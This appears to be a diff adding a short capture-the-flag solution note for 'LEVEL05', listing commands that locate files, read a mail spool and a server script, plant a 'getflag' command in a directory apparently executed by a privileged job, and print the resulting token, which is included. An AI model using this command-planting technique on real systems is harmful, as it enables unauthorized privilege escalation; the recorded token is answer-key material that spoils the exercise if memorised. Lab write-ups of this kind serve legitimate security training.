@@ -1,0 +1,7 @@
+LEVEL05:
+find / -name level05 -print 2>/dev/null
+cat /rofs/var/mail/level05
+cat /usr/sbin/openarenaserver
+echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+cat /tmp/flag
+-> token : viuaaale9huek52boumoomioc
